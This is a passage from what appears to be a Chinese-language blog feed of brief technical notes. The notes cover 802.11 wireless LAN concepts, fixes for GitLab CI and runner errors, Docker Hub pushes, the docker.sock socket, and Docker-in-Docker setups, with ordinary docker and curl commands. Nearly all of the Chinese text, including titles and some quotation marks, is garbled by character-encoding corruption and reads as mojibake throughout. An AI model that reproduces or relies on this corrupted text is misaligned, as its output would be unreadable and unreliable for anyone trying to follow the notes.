ç”µå­æ³¢çš„ä¸€éƒ¨åˆ†å—ç‰©ä½“å’Œåœ°é¢åå°„.</li></ul><p>æ— çº¿é“¾è·¯ä¸­çš„æ¯”ç‰¹å·®é”™å°†æ¯”æœ‰çº¿é“¾è·¯ä¸­æ›´ä¸ºå¸¸è§.</p><p>ä¿¡å™ªæ¯” (Signal-to-Noise Ratio, SNR), æ˜¯æ‰€å—åˆ°çš„ä¿¡å·å’Œå™ªå£°å¼ºåº¦çš„ç›¸å¯¹æµ‹é‡. è¾ƒå¤§çš„ SNR ä½¿æ¥æ”¶æ–¹æ›´å®¹æ˜“ä»èƒŒæ™¯å™ªå£°ä¸­æå–ä¼ è¾“çš„ä¿¡å·.</p><p>å¢åŠ ä¼ è¾“åŠŸç‡çš„ç¼ºç‚¹:</p><ul><li>å‘é€æ–¹æ¶ˆè€—æ›´å¤šçš„èƒ½é‡</li><li>å‘é€æ–¹çš„ä¼ è¾“æ›´å¯èƒ½å¹²æ‰°å¦ä¸€ä¸ªå‘é€æ–¹çš„ä¼ è¾“</li></ul><p>åœ¨<mark>æœ‰çº¿å¹¿æ’­å¹¿æ’­é“¾è·¯</mark>ä¸­, æ‰€æœ‰èŠ‚ç‚¹èƒ½å¤Ÿæ¥æ”¶åˆ°æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„ä¼ è¾“.</p><p>æ— çº¿ä¼ è¾“çš„ <mark>éšè—ç»ˆç«¯é—®é¢˜ (hidden terminal problem)</mark>, ä¿¡å·å¼ºä¼šå¹²æ‰°, ä¿¡å·å¼±ä¼šå› è¡°å‡æ— æ³•æ£€æµ‹.</p><h3 id="CDMA-Code-Division-Multiple-Access-ç åˆ†å¤šå€"><a href="#CDMA-Code-Division-Multiple-Access-ç åˆ†å¤šå€" class="headerlink" title="CDMA (Code Division Multiple Access, ç åˆ†å¤šå€)"></a>CDMA (Code Division Multiple Access, ç åˆ†å¤šå€)</h3><p>ä¸€ç§å°†è¦å‘é€çš„æ¯”ç‰¹ç¼–ç å‘é€çš„æ–¹æ³•, å…·ä½“å†…å®¹æ²¡çœ‹æ‡‚.</p><h2 id="7-3-WiFi-802-11-æ— çº¿-LAN"><a href="#7-3-WiFi-802-11-æ— çº¿-LAN" class="headerlink" title="7.3 WiFi: 802.11 æ— çº¿ LAN"></a>7.3 WiFi: 802.11 æ— çº¿ LAN</h2><p>è¿™æ˜¯ä¸€ä¸ªåè®®æ ‡å‡†.</p><p>802.11 è®¾å¤‡å·¥ä½œåœ¨ä¸¤ä¸ªä¸åŒçš„é¢‘ç‡æ®µä¸Š:</p><ul><li>2.4 ~ 2.485GHz, å³ 2.4GHz é¢‘æ®µ. ä¸€ç§æ— é¡»æ‰§ç…§çš„é¢‘æ®µ</li><li>5.1 ~ 5.8GHz, å³ 5GHz é¢‘æ®µ</li></ul><p><img src="/../img/IEEE_802_11.png"></p><h3 id="7-3-1-802-11-ä½“ç³»ç»“æ„"><a href="#7-3-1-802-11-ä½“ç³»ç»“æ„" class="headerlink" title="7.3.1 802.11 ä½“ç³»ç»“æ„"></a>7.3.1 802.11 ä½“ç³»ç»“æ„</h3><p>åŸºæœ¬æœåŠ¡é›† (Basic Service Set, BSS).</p><p>æ¥å…¥ç‚¹ (Access Point, AP, ä¼¼ä¹å°±æ˜¯ WiFi).</p><p>åŸºç«™ (Base Station).</p><p>ä¸€ä¸ª BSS åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ— çº¿ç«™ç‚¹å’Œä¸€ä¸ª AP. (æ— çº¿ç«™ç‚¹åº”è¯¥å°±æ˜¯è®¾å¤‡)</p><p>æ¯ä¸ª 802.11 æ— çº¿ç«™ç‚¹éƒ½å…·æœ‰ä¸€ä¸ª 6 å­—èŠ‚çš„ MAC åœ°å€, è¯¥åœ°å€å­˜å‚¨åœ¨è¯¥ç«™é€‚é…å™¨çš„å›ºä»¶ä¸­.</p><p>æ¯ä¸ª AP çš„æ— çº¿æ¥å£ä¹Ÿå…·æœ‰ä¸€ä¸ª MAC åœ°å€.</p><p>é…ç½® AP çš„æ— çº¿ LAN ç»å¸¸è¢«ç§°ä½œ <mark>åŸºç¡€è®¾æ–½æ— çº¿ LAN (infrastructure wireless LAN)</mark> </p><p><img src="/../img/IEEE_802_11_structure.png"></p><h4 id="ä¿¡é“ä¸å…³è”"><a href="#ä¿¡é“ä¸å…³è”" class="headerlink" title="ä¿¡é“ä¸å…³è”"></a>ä¿¡é“ä¸å…³è”</h4><p>å½“ç½‘ç»œç®¡ç†å‘˜å®‰è£…ä¸€ä¸ª AP æ—¶, ç®¡ç†å‘˜ä¸ºè¯¥æ¥å…¥ç‚¹åˆ†é…äº†ä¸€ä¸ªå•å­—æˆ–åŒå­—çš„ <mark>æœåŠ¡é›†æ ‡è¯†ç¬¦ (Service Set Identifier, SSID, å°±æ˜¯ WiFi åç§°)</mark> .</p><p>ç®¡ç†å‘˜è¿˜å¿…é¡»ä¸ºè¯¥ AP åˆ†é…ä¸€ä¸ªä¿¡é“å·. (å³ä¸€æ®µé¢‘ç‡, 802.11 è¿è¡Œåœ¨ 2.4 ~ 2.4835GHz çš„é¢‘æ®µå†…, åœ¨ 85MHz çš„é¢‘æ®µå†…, å®šä¹‰äº† &#96;&#96; ä¸ªéƒ¨åˆ†é‡å çš„ä¿¡é“, å½“ä¸”ä»…å½“ä¸¤ä¸ªä¿¡é“ç”± 4 ä¸ªæˆ–æ›´å¤šä¿¡é“éš”å¼€æ—¶å®ƒä»¬æ‰æ— é‡å , å¦‚ 1, 6, 11) è¿™æ„å‘³ç€ç®¡ç†å‘˜å¯ä»¥åœ¨åŒä¸€ä¸ªç‰©ç†ç½‘ç»œä¸­å®‰è£… 3 ä¸ª 802.11b AP, ä¸ºè¿™äº› AP åˆ†é…ä¿¡é“ 1, 6, å’Œ 11, ç„¶åå°†æ¯ä¸ª AP éƒ½è¿æ¥åˆ°ä¸€å°äº¤æ¢æœºä¸Š.</p><p><mark>WiFi ä¸›æ— (WiFi jungle)</mark> æ˜¯ä¸€ä¸ªä»»æ„ç‰©ç†ä½ç½®, åœ¨è¿™é‡Œæ— çº¿ç«™ç‚¹èƒ½ä»ä¸¤ä¸ªæˆ–å¤šä¸ª AP ä¸­æ”¶åˆ°æ’å¼ºçš„ä¿¡å·. (æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ªåŒºåŸŸå†…çš„ä¸€ä¸ªä½ç½®, è¿›å…¥ WiFi ä¸›æ—å°±æ˜¯è¿›å…¥è¿™ä¸ªä¿¡å·èŒƒå›´)</p><p>ä½ çš„æ— çº¿ç«™ç‚¹éœ€è¦åŠ å…¥å…¶ä¸­ä¸€ä¸ªå­ç½‘å¹¶å› æ­¤éœ€è¦ä¸å…¶ä¸­çš„ä¸€ä¸ª AP ç›¸<mark>å…³è” (associate)</mark>. å…³è”æ„å‘³ç€è¿™ä¸€æ— çº¿ç«™ç‚¹åœ¨è‡ªèº«å’Œè¯¥ AP ä¹‹é—´åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçº¿è·¯. ç‰¹åˆ«åœ°, ä»…æœ‰å…³è”çš„ AP æ‰å‘ä½ çš„æ— çº¿ç«™ç‚¹å‘é€æ•°æ®å¸§, å¹¶ä¸”ä½ çš„æ— çº¿ç«™ç‚¹ä¹Ÿä»…ä»…é€šè¿‡è¯¥å…³è” AP å‘å› ç‰¹ç½‘å‘é€æ•°æ®å¸§.</p><p><mark>æ— çº¿ç«™ç‚¹æŸ¥æ‰¾ AP çš„æ–¹å¼</mark>: 802.11 æ ‡å‡†è¦æ±‚æ¯ä¸ª AP å‘¨æœŸæ€§åœ°å‘é€ <mark>ä¿¡æ ‡å¸§ (beacon frame)</mark> , æ¯ä¸ªä¿¡æ ‡å¸§åŒ…æ‹¬è¯¥ AP çš„ SSID å’Œ MAC åœ°å€. ä½ çš„æ— çº¿ç«™ç‚¹ä¸ºäº†å¾—çŸ¥æ­£åœ¨å‘é€ä¿¡æ ‡å¸§çš„ AP, æ‰«æ 11 ä¸ªä¿¡é“, æ‰¾å‡ºæ¥è‡ªå¯èƒ½ä½äºè¯¥åŒºåŸŸçš„ AP æ‰€å‘å‡ºçš„ä¿¡æ ‡å¸§. é€šè¿‡ä¿¡æ ‡å¸§äº†è§£åˆ°å¯ç”¨çš„ AP å, ä½ é€‰æ‹©ä¸€ä¸ª AP ç”¨äºå…³è”.</p><p>é€šå¸¸, ä¸»æœºé€‰æ‹©æ¥æ”¶åˆ°å…·æœ‰æœ€é«˜ä¿¡å·å¼ºåº¦çš„ä¿¡æ ‡å¸§. ä½†ä¿¡å·å¼ºåº¦ä¸æ˜¯å”¯ä¸€å†³å®šä¸»æœºæ¥æ”¶æ€§èƒ½çš„ AP ç‰¹æ€§.</p><p>æ‰«æä¿¡é“å’Œç›‘å¬ä¿¡æ ‡å¸§çš„è¿‡ç¨‹è¢«ç§°ä¸º <mark>è¢«åŠ¨æ‰«æ (passive scanning)</mark>. æ— çº¿ä¸»æœºä¹Ÿèƒ½å¤Ÿæ‰§è¡Œ <mark>ä¸»åŠ¨æ‰«æ (active acanning)</mark> </p><p><img src="/../img/process_of_AP_scanning.png"></p><p>ä¸€æ—¦ä¸ä¸€ä¸ª AP å…³è”, è¯¥ä¸»æœºå¸Œæœ›åŠ å…¥è¯¥ AP æ‰€å±çš„å­ç½‘ä¸­. å› æ­¤, è¯¥ä¸»æœºé€šå¸¸å°†é€šè¿‡å…³è”çš„ AP å‘è¯¥å­ç½‘å‘é€ä¸€ä¸ª DHCP å‘ç°æŠ¥æ–‡, ä»¥è·å–åœ¨è¯¥ AP å­ç½‘ä¸­çš„ä¸€ä¸ª IP åœ°å€.</p><p>ä¸ä¸€ä¸ªç‰¹å®šçš„ AP åˆ›å»ºå…³è”, ä¸€ä¸ªæ— çº¿ç«™ç‚¹éœ€è¦å‘è¯¥ AP é‰´åˆ«è‡ªèº«. ä¸€èˆ¬é€šè¿‡ä¸€ä¸ªç«™ç‚¹çš„ MAC åœ°å€å…è®¸å…¶ä»‹å…¥ä¸€ä¸ªæ— çº¿ç½‘ç»œæˆ–åº”ç”¨ç”¨æˆ·åå’Œå£ä»¤. AP é€šå¸¸ä¸ä¸€ä¸ªé‰´åˆ«æœåŠ¡å™¨è¿›è¡Œé€šä¿¡. </p><h3 id="7-3-2-802-11-MAC-åè®®"><a href="#7-3-2-802-11-MAC-åè®®" class="headerlink" title="7.3.2 802.11 MAC åè®®"></a>7.3.2 802.11 MAC åè®®</h3><p>è¿™é‡Œå°†æ— çº¿è®¾å¤‡æˆ– AP ç§°ä¸º <mark>ç«™ç‚¹ (station)</mark> , å®ƒä»¬å…±äº«å¤šä¸ªæ¥å…¥ä¿¡é“.</p><p>802.11 æ— çº¿å±€åŸŸç½‘ä¸ä½¿ç”¨ç¢°æ’æ£€æµ‹, ä¸€æ—¦ç«™ç‚¹å¼€å§‹å‘é€ä¸€ä¸ªå¸§, å®ƒå°±å®Œå…¨åœ°å‘é€è¯¥å¸§.</p><p>802.11 é‡‡ç”¨çš„æ˜¯ç¢°æ’é¿å…æŠ€æœ¯.</p><p>å¤„ç†å‘é€çš„å¸§ä¸èƒ½æ— æŸåˆ°è¾¾ç›®çš„åœ°é—®é¢˜, 802.11 ä½¿ç”¨ <mark>é“¾è·¯å±‚ç¡®è®¤ (link-layer acknowledgment)</mark> </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-gitlab-ci-ä½¿ç”¨-ssh-æ—¶-invalid-format-æŠ¥é”™</title>
    <link href="/2022/11/06/%E5%85%B3%E4%BA%8E-gitlab-ci-%E4%BD%BF%E7%94%A8-ssh-%E6%97%B6-invalid-format-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/%E5%85%B3%E4%BA%8E-gitlab-ci-%E4%BD%BF%E7%94%A8-ssh-%E6%97%B6-invalid-format-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™å¦‚ä¸‹:<br><img src="/../img/ssh_invalid_format.png"></p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a><a href="https://stackoverflow.com/questions/52109775/gitlab-ci-ssh-key-invalid-format">è§£å†³</a></h1><p>å–æ¶ˆ <code>protected</code> çš„è®¾ç½®.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Arch-æ›´æ–°å-docker-compose-æŠ¥é”™</title>
    <link href="/2022/11/06/%E5%85%B3%E4%BA%8E-Arch-%E6%9B%B4%E6%96%B0%E5%90%8E-docker-compose-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/%E5%85%B3%E4%BA%8E-Arch-%E6%9B%B4%E6%96%B0%E5%90%8E-docker-compose-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://serverfault.com/questions/738773/docker-failed-to-add-the-pair-interfaces-operation-not-supported">å‚è€ƒ</a></p><p>ç±»ä¼¼äºè¿™æ ·çš„æŠ¥é”™ï¼Œå¿˜è®°æˆªå±äº†:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>response from daemon: Cannot start container 4145d0fccd96b904e4ab4413735f1129b8765429bad5be71dc8d5f4c0760666d:<br>failed to create endpoint high_saha on network bridge:<br>failed to add the host (veth7f6f907) &lt;=&gt; sandbox (veth788d9dc) pair interfaces: operation not supported<br></code></pre></td></tr></table></figure><p>é‡å¯å³å¯.</p><p>åŸå› ä¸ºï¼Œåœ¨å†…æ ¸æ›´æ–°åï¼Œæ‰€æœ‰çš„åœ¨  <code>/usr/lib/modules/&#123;KERNEL_VERSION&#125;</code> ä¸‹çš„ <code>.ko</code> æ¨¡å—æ–‡ä»¶ä¼šè¢«åˆ æ‰ï¼Œè€Œ docker éœ€è¦ä¸€äº›æ¨¡å—æ¥åˆ›å»ºæ¥å£ï¼Œé‡å¯å¯ä»¥é‡æ–°åŠ è½½è¿™äº›æ¨¡å—.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gitlab-æ­å»ºå¥½åæœåŠ¡å™¨å¡é¡¿ä»¥åŠ502æŠ¥é”™</title>
    <link href="/2022/11/06/gitlab-%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF%E4%BB%A5%E5%8F%8A502%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/gitlab-%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF%E4%BB%A5%E5%8F%8A502%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>åŸå› æ˜¯ gitlab ä¼šå ç”¨å¤§é‡çš„å†…å­˜.</p><p><a href="https://cloud.tencent.com/developer/article/1710156">å‚è€ƒ2</a></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-gitlab-ci-æ—¶æŠ¥é”™-unable-to-access</title>
    <link href="/2022/11/06/%E4%BD%BF%E7%94%A8-gitlab-ci-%E6%97%B6%E6%8A%A5%E9%94%99-unable-to-access/"/>
    <url>/2022/11/06/%E4%BD%BF%E7%94%A8-gitlab-ci-%E6%97%B6%E6%8A%A5%E9%94%99-unable-to-access/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™å¦‚ä¸‹:</p><p><img src="/../img/gitlab-ci-unable-to-access.png"></p><h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://forum.gitlab.com/t/gitlab-runner-connection-refused/33589">å‚è€ƒ1</a></h1><p>è¿™ç¯‡æ–‡ç« ä¸­ç¡®å®šäº†é—®é¢˜æ‰€åœ¨ï¼Œåœ¨ docker è¿è¡Œç¯å¢ƒä¸‹ï¼Œå®ƒæ‰¾ä¸åˆ° <code>127.0.0.1</code>.</p><h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a><a href="https://docs.gitlab.com/runner/configuration/advanced-configuration.html#how-clone_url-works">solution</a></h1><p>æ·»åŠ  <code>clone_url</code> è§£å†³.</p><p><img src="/../img/clone_url_solution.png"></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker-æ¨é€åˆ°-dockerhub-ä¸Šæ—¶æŠ¥é”™</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker-%E6%8E%A8%E9%80%81%E5%88%B0-dockerhub-%E4%B8%8A%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker-%E6%8E%A8%E9%80%81%E5%88%B0-dockerhub-%E4%B8%8A%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.biostars.org/p/9531985/">å‚è€ƒ</a></p><p>æ¨é€ä¹‹å‰ä¸ç”¨å…ˆåœ¨ dockerhub ä¸Šåˆ›å»ºä»“åº“.</p><p>é‡æ–°æ‰“ä¸€ä¸‹æ ‡ç­¾ï¼Œæ ¼å¼ä¸º:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker login -u <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$PASSWD</span>&quot;</span><br>$ docker tag image_name YOUR_DOCKERHUB_NAME/image_name<br>$ docker push YOUR_DOCKERHUB_NAME/image_name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-gitlab-runner-æ³¨å†Œæ—¶æŠ¥é”™</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-runner-%E6%B3%A8%E5%86%8C%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-runner-%E6%B3%A8%E5%86%8C%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™å¦‚ä¸‹:<br><img src="/../img/gitlab_runner_error.png"></p><p>å¯èƒ½æ˜¯ä»£ç†åŸå› ï¼Œä½†æ˜¯ç§»å‡º <code>http_proxy</code> å’Œ <code>https_proxy</code> ä¸¤ä¸ªç¯å¢ƒå˜é‡ä»ç„¶æŠ¥é”™ï¼Œä½†æ˜¯åœ¨å¦ä¸€å°æœºå™¨ä¸Šæ‰§è¡Œå³æˆåŠŸæ³¨å†Œ.</p><h1 id="å¦ä¸€ä¸ªé”™è¯¯"><a href="#å¦ä¸€ä¸ªé”™è¯¯" class="headerlink" title="å¦ä¸€ä¸ªé”™è¯¯"></a>å¦ä¸€ä¸ªé”™è¯¯</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PANIC: Near <span class="hljs-built_in">line</span> <span class="hljs-number">51</span> (<span class="hljs-keyword">last</span> key parsed <span class="hljs-string">&#x27;runners.docker.volumes&#x27;</span>): Key <span class="hljs-string">&#x27;runners.docker.volumes&#x27;</span> <span class="hljs-built_in">has</span> already been defined.<br></code></pre></td></tr></table></figure><p>å…¶åŸå› æ˜¯ä¸€ä¸ª runner ä¸Šæ³¨å†Œå¤ªå¤šäº†ï¼Œæ¸…ç†ä¸€ä¸‹é…ç½®æ–‡ä»¶ <code>/srv/gitlab-runner/config/config.toml</code> å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºåœ¨-dind-å®¹å™¨ä¸­ä½¿ç”¨-docker-å‘½ä»¤åæŠ¥é”™</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E%E5%9C%A8-dind-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8-docker-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E%E5%9C%A8-dind-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8-docker-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™å†…å®¹å¦‚ä¸‹:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">error </span>during connect: Get &quot;http://docker:2375/v1.24/images/json&quot;: dial tcp: lookup docker on 114.114.114.114:53: no such host<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://www.bilibili.com/video/BV1sK4y1d7ej/?spm_id_from=pageDriver&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></h1><p>é€šè¿‡ä¿®æ”¹ runner çš„é…ç½®æ–‡ä»¶è§£å†³.</p><p>å¦‚ï¼Œåœ¨ <code>/srv/gitlab-runner/config/config.toml</code>æ·»åŠ ä¸¤ä¸ª volume.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[<span class="hljs-string">&quot;/usr/bin/docker:/usr/bin/docker&quot;</span>, <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span>]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-Jenkins</title>
    <link href="/2022/11/05/%E4%BB%80%E4%B9%88%E6%98%AF-Jenkins/"/>
    <url>/2022/11/05/%E4%BB%80%E4%B9%88%E6%98%AF-Jenkins/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV15y4y1r7Da/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ1</a></p><p>æ€»çš„æ¥è¯´ï¼Œæ˜¯ä¸€ä¸ªå·¥å…·ï¼Œå…¶å°†ä¼ ç»Ÿçš„ ç”Ÿäº§ -&gt; é›†æˆ -&gt; æµ‹è¯• -&gt; éƒ¨ç½² çš„æ­¥éª¤è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker.sock</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker.sock/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker.sock/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://blog.csdn.net/qq_42997214/article/details/122990008">å‚è€ƒ1</a></h1><p>docker æ˜¯ client-server æ¶æ„.</p><p><code>/var/run/docker.sock</code> æ˜¯ docker daemon ç›‘å¬çš„å¥—æ¥å­—ï¼Œå®¹å™¨ä¸­çš„è¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒä¸ docker daemon é€šä¿¡.</p><p>å°† <code>/var/run/docker.sock</code> æŒ‚è½½åˆ°å®¹å™¨ä¸­. å®¹å™¨å°±å¯ä»¥é€šè¿‡å‘ <code>/var/run/docker.sock</code> å‘é€ http è¯·æ±‚æ¥å’Œ docker daemon é€šä¿¡.</p><p>ä¹Ÿå°±æ˜¯æ˜¯è¯´ <code>docker run</code> ä¹‹ç±»çš„å‘½ä»¤å®é™…ä¸Šæ˜¯è½¬æ¢ä¸ºå‘è¿™ä¸ªå¥—æ¥å­—å‘å‡ºçš„è¯·æ±‚. </p><p>å› æ­¤ï¼Œè‹¥å®¹å™¨ä¸­æœ‰ docker çš„å‘½ä»¤è¡Œå·¥å…·å’Œå®¿ä¸»æœºä¸Šçš„ <code>/var/run/docker.sock</code> æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨ dockr ä¹‹å†…è¿è¡Œ docker å‘½ä»¤.</p><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://blog.51cto.com/topic/docker.sockwenjian.html">å‚è€ƒ2</a></h1><p>å¯ä»¥ç”¨ <code>curl</code> å‘½ä»¤å‘ <code>/var/run/docker.sock</code> å¥—æ¥å­—å‘é€ http è¯·æ±‚ï¼Œå¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl -XPOST --unix-socket /var/run/docker.sock -d â€˜&#123;â€œImageâ€:â€nginxâ€&#125;â€™ -H â€˜Content-Type: application/jsonâ€™ http://localhost/containers/create<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-docker-dind</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker-dind/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker-dind/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://blog.csdn.net/u010533742/article/details/116801020">å‚è€ƒ1</a></h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>dind æ˜¯ docker in docker çš„æ„æ€.</p><p>å…¶åŸç†æ˜¯åœ¨ docker å®¹å™¨å†…åŒ…å« docker å‘½ä»¤è¡Œå·¥å…·ï¼Œå…¶å®é™…çš„æ‰§è¡Œäº¤è¿˜ç»™å®¿ä¸»æœºçš„ docker-engine æ‰§è¡Œ.</p><h2 id="ä¸ºä»€ä¹ˆä½¿ç”¨-Docker-in-Docker"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨-Docker-in-Docker" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ Docker-in-Docker"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ Docker-in-Docker</h2><p>åœ¨ pipline ä¸­è¿è¡Œçš„ç¯å¢ƒä¸º docker, è‹¥è¿˜è¦ä½¿ç”¨ docker å‘½ä»¤ï¼Œåˆ™å½¢æˆäº† Docker-in-Docker.</p><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://blog.nestybox.com/2019/09/14/dind.html">å‚è€ƒ2</a></h1><p>ä¸¤ç§å®ç° Docker-in-Docker çš„æ–¹å¼:</p><ul><li>DinD, Docker-in-Docker åœ¨ä¸€ä¸ªå®¹å™¨å†…è¿è¡Œ Docker daemon</li><li>DooD, Docker-out-of-Docker, åªåœ¨å®¹å™¨å†…è¿è¡Œ Docker CLI, å’Œå®¿ä¸»æœºçš„ Docker daemon è¿æ¥.</li></ul><h2 id="DinD"><a href="#DinD" class="headerlink" title="DinD"></a>DinD</h2><p>åˆ©ç”¨ dind è¿™ä¸ªé•œåƒ.</p><p>åŸç†å›¾:<br><img src="/../img/Docker_DinD.png"></p><h2 id="DooD"><a href="#DooD" class="headerlink" title="DooD"></a>DooD</h2><p>å°†å®¿ä¸»æœºçš„ <code>docker.sock</code> æ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨ä¸­.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker<br></code></pre></td></tr></table></figure><p>åŸç†å›¾å¦‚ä¸‹:<br><img src="/../img/Docker_DooD.png"></p><p>å¥½å¤„:</p><ul><li>å‡å°‘å¤æ‚æ€§</li><li>é˜²æ­¢ä½¿ç”¨ä¸å®‰å…¨çš„ privileged container</li></ul><p>ç¼ºç‚¹:</p><ul><li>åç§°å†²çª, å’Œå®¿ä¸»æœºçš„å®¹å™¨åç§°ä¸èƒ½ç›¸åŒ</li><li>æŒ‚åœ¨è·¯å¾„, åœ¨å®¹å™¨å†…ç”¨ Docker CLI æŒ‚è½½ç›®å½•æ—¶æ˜¯ç›¸å¯¹äºå®¿ä¸»æœº</li><li>ç«¯å£æ˜ å°„ï¼ŒåŒæ ·æ˜¯å’Œå®¿ä¸»æœº.</li></ul><h2 id="ä½¿ç”¨-Nestrbox"><a href="#ä½¿ç”¨-Nestrbox" class="headerlink" title="ä½¿ç”¨ Nestrbox"></a>ä½¿ç”¨ Nestrbox</h2>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-gitlab-çš„ä½¿ç”¨å’Œç†è§£</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/"/>
